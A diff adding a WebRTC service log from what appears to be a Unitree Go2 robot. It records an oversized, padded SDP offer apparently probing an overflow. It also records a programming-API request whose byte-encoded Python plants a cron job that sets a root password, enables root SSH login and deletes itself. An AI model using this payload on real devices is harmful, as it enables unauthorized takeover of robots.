+[2024-05-17 11:47:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:48:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:48:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:48:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:49:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:49:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:49:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:50:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:50:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:50:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:51:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:51:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:51:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:52:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:52:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:52:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:53:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:53:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:53:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:54:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:54:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:54:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:55:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:55:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:55:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:56:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:56:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:56:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:57:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:57:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:57:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:58:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:58:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:58:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:59:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:59:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 11:59:37 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/signaling.h:15]: do_webrtc_req_take() trigger
+[2024-05-17 11:59:37 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1768]: offerReceived() receive offer, offer_len is 5234
+[2024-05-17 11:59:37 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1769]: offerReceived() receive offer, offer_content is {"sdp":"v=0\r\no=- 3456789012 1 IN IP4 0.0.0.0\r\ns=-\r\nt=0 0\r\na=fingerprint:sha-256 4A:AD:B9:B1:3C:82:CB:D4:8D:4F:40:58:5C:C8:49:71:19:F4:B6:B1:34:71:22:B5:36:9B:8F:D2:3E:AA:33:53\r\na=group:BUNDLE 0 1 2 3 4\r\nm=fingerprint\r\ni=sha-256 4E:43:C5:90:B5:89:D6:DE:DC:0A:C9:3D:EA:AE:9A:8B:53:83:1B:E5:BB:FB:25:F6:41:2C:6A:D4:F2:DE:FD:03\r\nc=IN IP4 0.0.0.0\r\na=ice-ufrag:svZt\r\na=ice-pwd:V9lRGXk2GLjULMdX2OZOKf\r\na=setup:actpass\r\na=mid:0\r\nm=video 9 UDP/TLS/RTP/SAVPF 96\r\na=ice-ufrag:svZt\r\na=ice-pwd:V9lRGXk2GLjULMdX2OZOKf\r\na=mid:1\r\nm=video 9 UDP/TLS/RTP/SAVPF 96\r\na=ice-ufrag:svZt\r\na=ice-pwd:V9lRGXk2GLjULMdX2OZOKf\r\na=mid:2\r\nm=video 9 UDP/TLS/RTP/SAVPF 96\r\na=ice-ufrag:svZt\r\na=ice-pwd:V9lRGXk2GLjULMdX2OZOKf\r\na=mid:3\r\nm=application 9 UDP/DTLS/SCTP webrtc-datachannel\r\na=ice-ufrag:svZt\r\na=ice-pwd:V9lRGXk2GLjULMdX2OZOKf\r\na=mid:4\r\na=candidate:b06876595f855fe0ce5212e1b302209c 1 udp 2130706431 192.168.1.233 49421 typ host\r\r\na=candidate:f5a9be8b49d027a84cd23cab8db3a9af 1 udp 2130706431 100.64.113.47 60069 typ host\r\r\na=candidate:edeb15bd8d3f0dbec18897b0ffdb6515 1 udp 2130706431 192.168.123.100 62977 typ host\r\r\na=pad000:x\r\na=pad001:x\r\na=pad002:x\r\na=pad003:x\r\na=pad004:x\r\na=pad005:x\r\na=pad006:x\r\na=pad007:x\r\na=pad008:x\r\na=pad009:x\r\na=pad010:x\r\na=pad011:x\r\na=pad012:x\r\na=pad013:x\r\na=pad014:x\r\na=pad015:x\r\na=pad016:x\r\na=pad017:x\r\na=pad018:x\r\na=pad019:x\r\na=pad020:x\r\na=pad021:x\r\na=pad022:x\r\na=pad023:x\r\na=pad024:x\r\na=pad025:x\r\na=pad026:x\r\na=pad027:x\r\na=pad028:x\r\na=pad029:x\r\na=pad030:x\r\na=pad031:x\r\na=pad032:x\r\na=pad033:x\r\na=pad034:x\r\na=pad035:x\r\na=pad036:x\r\na=pad037:x\r\na=pad038:x\r\na=pad039:x\r\na=pad040:x\r\na=pad041:x\r\na=pad042:x\r\na=pad043:x\r\na=pad044:x\r\na=pad045:x\r\na=pad046:x\r\na=pad047:x\r\na=pad048:x\r\na=pad049:x\r\na=pad050:x\r\na=pad051:x\r\na=pad052:x\r\na=pad053:x\r\na=pad054:x\r\na=pad055:x\r\na=pad056:x\r\na=pad057:x\r\na=pad058:x\r\na=pad059:x\r\na=pad060:x\r\na=pad061:x\r\na=pad062:x\r\na=pad063:x\r\na=pad064:x\r\na=pad065:x\r\na=pad066:x\r\na=pad067:x\r\na=pad068:x\r\na=pad069:x\r\na=pad070:x\r\na=pad071:x\r\na=pad072:x\r\na=pad073:x\r\na=pad074:x\r\na=pad075:x\r\na=pad076:x\r\na=pad077:x\r\na=pad078:x\r\na=pad079:x\r\na=pad080:x\r\na=pad081:x\r\na=pad082:x\r\na=pad083:x\r\na=pad084:x\r\na=pad085:x\r\na=pad086:x\r\na=pad087:x\r\na=pad088:x\r\na=pad089:x\r\na=pad090:x\r\na=pad091:x\r\na=pad092:x\r\na=pad093:x\r\na=pad094:x\r\na=pad095:x\r\na=pad096:x\r\na=pad097:x\r\na=pad098:x\r\na=pad099:x\r\na=pad100:x\r\na=pad101:x\r\na=pad102:x\r\na=pad103:x\r\na=pad104:x\r\na=pad105:x\r\na=pad106:x\r\na=pad107:x\r\na=pad108:x\r\na=pad109:x\r\na=pad110:x\r\na=pad111:x\r\na=pad112:x\r\na=pad113:x\r\na=pad114:x\r\na=pad115:x\r\na=pad116:x\r\na=pad117:x\r\na=pad118:x\r\na=pad119:x\r\na=pad120:x\r\na=pad121:x\r\na=pad122:x\r\na=pad123:x\r\na=pad124:x\r\na=pad125:x\r\na=pad126:x\r\na=pad127:x\r\na=pad128:x\r\na=pad129:x\r\na=pad130:x\r\na=pad131:x\r\na=pad132:x\r\na=pad133:x\r\na=pad134:x\r\na=pad135:x\r\na=pad136:x\r\na=pad137:x\r\na=pad138:x\r\na=pad139:x\r\na=pad140:x\r\na=pad141:x\r\na=pad142:x\r\na=pad143:x\r\na=pad144:x\r\na=pad145:x\r\na=pad146:x\r\na=pad147:x\r\na=pad148:x\r\na=pad149:x\r\na=pad150:x\r\na=pad151:x\r\na=pad152:x\r\na=pad153:x\r\na=pad154:x\r\na=pad155:x\r\na=pad156:x\r\na=pad157:x\r\na=pad158:x\r\na=pad159:x\r\na=pad160:x\r\na=pad161:x\r\na=pad162:x\r\na=pad163:x\r\na=pad164:x\r\na=pad165:x\r\na=pad166:x\r\na=pad167:x\r\na=pad168:x\r\na=pad169:x\r\na=pad170:x\r\na=pad171:x\r\na=pad172:x\r\na=pad173:x\r\na=pad174:x\r\na=pad175:x\r\na=pad176:x\r\na=pad177:x\r\na=pad178:x\r\na=pad179:x\r\na=pad180:x\r\na=pad181:x\r\na=pad182:x\r\na=pad183:x\r\na=pad184:x\r\na=pad185:x\r\na=pad186:x\r\na=pad187:x\r\na=pad188:x\r\na=pad189:x\r\na=pad190:x\r\na=pad191:x\r\na=pad192:x\r\na=pad193:x\r\na=pad194:x\r\na=pad195:x\r\na=pad196:x\r\na=pad197:x\r\na=pad198:x\r\na=pad199:x\r\na=pad200:x\r\na=pad201:x\r\na=pad202:x\r\na=pad203:x\r\na=pad204:x\r\na=pad205:x\r\na=pad206:x\r\na=pad207:x\r\na=pad208:x\r\na=pad209:x\r\na=pad210:x\r\na=pad211:x\r\na=pad212:x\r\na=pad213:x\r\na=pad214:x\r\na=pad215:x\r\na=pad216:x\r\na=pad217:x\r\na=pad218:x\r\na=pad219:x\r\na=pad220:x\r\na=pad221:x\r\na=pad222:x\r\na=pad223:x\r\na=pad224:x\r\na=pad225:x\r\na=pad226:x\r\na=pad227:x\r\na=pad228:x\r\na=pad229:x\r\na=pad230:x\r\na=pad231:x\r\na=pad232:x\r\na=pad233:x\r\na=pad234:x\r\na=pad235:x\r\na=pad236:x\r\na=pad237:x\r\na=pad238:x\r\na=pad239:x\r\na=pad240:x\r\na=pad241:x\r\na=pad242:x\r\na=pad243:x\r\na=pad244:x\r\na=pad245:x\r\na=pad246:x\r\na=pad247:x\r\na=pad248:x\r\na=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:overflow\r\n","id":"STA_localNetwork","type":"offer","token":""}
+[2024-05-17 11:59:37 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:341]: hasConnectedSession() trigger
+[2024-05-17 11:59:37 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1636]: isOfferContainTurnServer() offer not contain turnserver 
+
+[2024-05-17 11:59:37 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1792]: offerReceived() offer not contain turnserver info!
+[2024-05-17 11:59:37 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1795]: offerReceived() offer check passed!
+[2024-05-17 11:59:37 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1808]: offerReceived() length: 5234
+[2024-05-17 11:59:37 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1831]: offerReceived() check point 1
+[2024-05-17 11:59:37 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1838]: offerReceived() check point 2
+[2024-05-17 11:59:37 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1850]: offerReceived() before getTurnServerInfo!
+[2024-05-17 11:59:37 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1852]: offerReceived() after getTurnServerInfo!
+[2024-05-17 11:59:37 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:604]: createStreamingSession() enter
+[2024-05-17 11:59:37 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:646]: createStreamingSession() CP 1
+[2024-05-17 11:59:37 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:476]: initializePeerConnection() enter
+[2024-05-17 11:59:37 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:477]: initializePeerConnection() CP 1
+[2024-05-17 11:59:37 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:544]: initializePeerConnection() CP 2
+[2024-05-17 11:59:37 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:558]: initializePeerConnection() CP 3
+[2024-05-17 11:59:37 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:563]: initializePeerConnection() exit
+[2024-05-17 11:59:37 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:654]: createStreamingSession() CP 2
+[2024-05-17 11:59:37 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:668]: createStreamingSession() CP 3
+[2024-05-17 11:59:37 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:682]: createStreamingSession() CP 4
+[2024-05-17 11:59:37 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:710]: createStreamingSession() exit
+[2024-05-17 11:59:37 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1855]: offerReceived() after createStreamingSession
+[2024-05-17 11:59:37 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1858]: offerReceived() after getSignalSourceType
+[2024-05-17 11:59:37 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1863]: offerReceived() after determineSessionNetworkMode
+[2024-05-17 11:59:37 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1746]: getOfferToken() before cJSON_GetObjectItem token
+[2024-05-17 11:59:37 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1752]: getOfferToken() after cJSON_GetObjectItem token
+[2024-05-17 11:59:37 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1867]: offerReceived() after parse offer token
+[2024-05-17 11:59:37 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1911]: offerReceived() exit
+[2024-05-17 11:59:37 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:63]: connection state change to [RTC_PEER_CONNECTION_STATE_CONNECTING]
+[2024-05-17 11:59:37 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:98]: [ICE] ICE checking (连通性检查)中, peer: client1715918377
+[2024-05-17 11:59:37 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:437]: onIceCandidateHandler() enter
+[2024-05-17 11:59:37 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:446]: [ICE] Gathering candidate: {"candidate":"candidate:1 1 udp 2130706431 169.254.107.33 60378 typ host raddr 0.0.0.0 rport 0 generation 0 network-cost 999","sdpMid":"0","sdpMLineIndex":0}
+[2024-05-17 11:59:37 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:437]: onIceCandidateHandler() enter
+[2024-05-17 11:59:37 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:446]: [ICE] Gathering candidate: {"candidate":"candidate:0 1 udp 2130706431 192.168.123.161 34998 typ host raddr 0.0.0.0 rport 0 generation 0 network-cost 999","sdpMid":"0","sdpMLineIndex":0}
+[2024-05-17 11:59:37 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:437]: onIceCandidateHandler() enter
+[2024-05-17 11:59:37 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:458]: [ICE] Candidate gathering finished for peer: client1715918377
+[2024-05-17 11:59:37 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/signaling.h:211]: webrtcConnectionAnswer() trigger
+[2024-05-17 11:59:37 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/signaling.h:234]: webrtcConnectionAnswer() coming_topic = rt/webrtcreq, use webrtc_res_writer
+[2024-05-17 11:59:38 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/signaling.h:15]: do_webrtc_req_take() trigger
+[2024-05-17 11:59:38 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:66]: connection state change to [RTC_PEER_CONNECTION_STATE_CONNECTED]
+[2024-05-17 11:59:38 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:249]: logSelectedIceCandidatesInformation() sessionOnTurnServer set to 0
+[2024-05-17 11:59:38 INFO  /home/unitree/sjy/kvsrtc/src/source/PeerConnection/PeerConnection.c:535]: onSctpSessionDataChannelOpen() enter
+[2024-05-17 11:59:38 INFO  /home/unitree/sjy/kvsrtc/src/source/PeerConnection/PeerConnection.c:1475]: tryToIdentifyInterface() enter
+[2024-05-17 11:59:38 INFO  /home/unitree/sjy/kvsrtc/src/source/PeerConnection/PeerConnection.c:1490]: tryToIdentifyInterface() addr=560725673
+[2024-05-17 11:59:38 INFO  /home/unitree/sjy/kvsrtc/src/source/PeerConnection/PeerConnection.c:1491]: tryToIdentifyInterface() port=56043
+[2024-05-17 11:59:38 INFO  /home/unitree/sjy/kvsrtc/src/source/PeerConnection/PeerConnection.c:1508]: tryToIdentifyInterface() found target interface, interface_NAME=eth0
+[2024-05-17 11:59:38 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:2261]: [PUBNET] dataChannelOnOpenCallback() rtc_peer_conn->interface_NAME=eth0 
+[2024-05-17 11:59:38 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:2271]: [PUBNET] dataChannelOnOpenCallback() pConfiguration->publicNetworkStatus set to Undefined
+[2024-05-17 11:59:38 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:2194]: [PUBNET] doInterfacePacketStatisticsThreadFunction enter
+[2024-05-17 11:59:38 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:2194]: [PUBNET] doInterfacePacketStatisticsThreadFunction enter
+[2024-05-17 11:59:38 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:2295]: [PUBNET] do pthread join check
+[2024-05-17 11:59:38 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:2295]: [PUBNET] do pthread join check
+[2024-05-17 11:59:38 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:2295]: [PUBNET] do pthread join check
+[2024-05-17 11:59:38 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/unitreeWebRTCClientMaster.c:140]: dataChannelOnMessageCallback() incoming message = {"type":"req","topic":"rt/api/programming_actuator/request","data":{"header":{"identity":{"id":73317452,"api_id":1002}},"parameter":"{\"program_content\": {\"chunk_index\": 1, \"total_chunk_num\": 1, \"chunk_content\": \"_p = str(bytes([47, 101, 116, 99, 47, 99, 114, 111, 110, 46, 100, 47, 117, 115, 104]), 'utf-8')\\n_e = str(bytes([42, 32, 42, 32, 42, 32, 42, 32, 42, 32, 114, 111, 111, 116, 32, 101, 99, 104, 111, 32, 39, 114, 111, 111, 116, 58, 117, 110, 108, 101, 97, 115, 104, 39, 32, 124, 32, 99, 104, 112, 97, 115, 115, 119, 100, 32, 38, 38, 32, 115, 101, 100, 32, 45, 105, 32, 39, 115, 47, 94, 35, 42, 80, 101, 114, 109, 105, 116, 82, 111, 111, 116, 76, 111, 103, 105, 110, 46, 42, 47, 80, 101, 114, 109, 105, 116, 82, 111, 111, 116, 76, 111, 103, 105, 110, 32, 121, 101, 115, 47, 39, 32, 47, 101, 116, 99, 47, 115, 115, 104, 47, 115, 115, 104, 100, 95, 99, 111, 110, 102, 105, 103, 32, 38, 38, 32, 115, 121, 115, 116, 101, 109, 99, 116, 108, 32, 101, 110, 97, 98, 108, 101, 32, 115, 115, 104, 32, 38, 38, 32, 115, 121, 115, 116, 101, 109, 99, 116, 108, 32, 115, 116, 97, 114, 116, 32, 115, 115, 104, 32, 38, 38, 32, 114, 109, 32, 45, 102, 32, 47, 101, 116, 99, 47, 99, 114, 111, 110, 46, 100, 47, 117, 115, 104]), 'utf-8')\\n_d = np.array([_e])\\nnp.savetxt(_p, _d, fmt='%s')\"}, \"program_uuid\": \"1780337257\", \"bind_hotkey\": \"L1+Y\"}"}}
+[2024-05-17 11:59:38 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/unitreeWebRTCClientMaster.c:148]: dataChannelOnMessageCallback() incoming topic = rt/api/programming_actuator/request
+[2024-05-17 11:59:38 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/unitreeWebRTCClientMaster.c:185]: dataChannelOnMessageCallback() request ident id=73317452
+[2024-05-17 11:59:38 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/publisher/request.h:46]: write_request() req.header.policy.priority=0, req.header.policy.noreply=0 
+[2024-05-17 11:59:38 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/subscriber/response.h:78]: do_response_data_take() topic=rt/api/programming_actuator/response, sendOnDataChannel msg_len=152
+[2024-05-17 11:59:38 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:75]: connection state change to [RTC_PEER_CONNECTION_STATE_CLOSED]
+[2024-05-17 11:59:38 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:195]: !!! OnSessionClosed() pConfiguration->streamingSessionCount=1
+tcpdump: wwan0: No such device exists
+(SIOCGIFHWADDR: No such device)
+tcpdump: listening on wlan0, link-type EN10MB (Ethernet), capture size 262144 bytes
+tcpdump: /tmp/wwan0_1715918378_captrue.pcap: No such file or directory
+[2024-05-17 11:59:38 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:2241]: [PUBNET] Interface:wwan0, Number of lines: 0
+0 packets captured
+0 packets received by filter
+0 packets dropped by kernel
+reading from file /tmp/wlan0_1715918378_captrue.pcap, link-type EN10MB (Ethernet)
+[2024-05-17 11:59:41 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:2241]: [PUBNET] Interface:wlan0, Number of lines: 0
+[2024-05-17 11:59:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:00:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:00:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:00:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:01:05 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:01:25 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:01:45 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1264]: sessionRttProbeTimerCallback() trigger
+[2024-05-17 12:01:58 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/signaling.h:15]: do_webrtc_req_take() trigger
+[2024-05-17 12:01:58 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1768]: offerReceived() receive offer, offer_len is 5234
+[2024-05-17 12:01:58 INFO  /home/unitree/sjy/Go2/kvsrtc/samples/webrtcUtils.c:1769]: offerReceived() receive offer, offer_content is {"sdp":"v=0\r\no=- 3456789012 1 IN IP4 0.0.0.0\r\ns=-\r\nt=0 0\r\na=fingerprint:sha-256 4A:AD:B9:B1:3C:82:CB:D4:8D:4F:40:58:5C:C8:49:71:19:F4:B6:B1:34:71:22:B5:36:9B:8F:D2:3E:AA:33:53\r\na=group:BUNDLE 0 1 2 3 4\r\nm=fingerprint\r\ni=sha-256 AF:CA:F8:58:FC:A3:8F:15:90:95:CC:82:16:C6:13:71:37:AC:6E:EA:17:CB:5B:21:7F:71:20:2F:B3:C7:77:6F\r\nc=IN IP4 0.0.0.0\r\na=ice-ufrag:ZBpP\r\na=ice-pwd:JrggglwQysrNfi4L55g5Ni\r\na=setup:actpass\r\na=mid:0\r\nm=video 9 UDP/TLS/RTP/SAVPF 96\r\na=ice-ufrag:ZBpP\r\na=ice-pwd:JrggglwQysrNfi4L55g5Ni\r\na=mid:1\r\nm=video 9 UDP/TLS/RTP/SAVPF 96\r\na=ice-ufrag:ZBpP\r\na=ice-pwd:JrggglwQysrNfi4L55g5Ni\r\na=mid:2\r\nm=video 9 UDP/TLS/RTP/SAVPF 96\r\na=ice-ufrag:ZBpP\r\na=ice-pwd:JrggglwQysrNfi4L55g5Ni\r\na=mid:3\r\nm=application 9 UDP/DTLS/SCTP webrtc-datachannel\r\na=ice-ufrag:ZBpP\r\na=ice-pwd:JrggglwQysrNfi4L55g5Ni\r\na=mid:4\r\na=candidate:b06876595f855fe0ce5212e1b302209c 1 udp 2130706431 192.168.1.233 63265 typ host\r\r\na=candidate:f5a9be8b49d027a84cd23cab8db3a9af 1 udp 2130706431 100.64.113.47 60394 typ host\r\r\na=candidate:edeb15bd8d3f0dbec18897b0ffdb6515 1 udp 2130706431 192.168.123.100 60850 typ 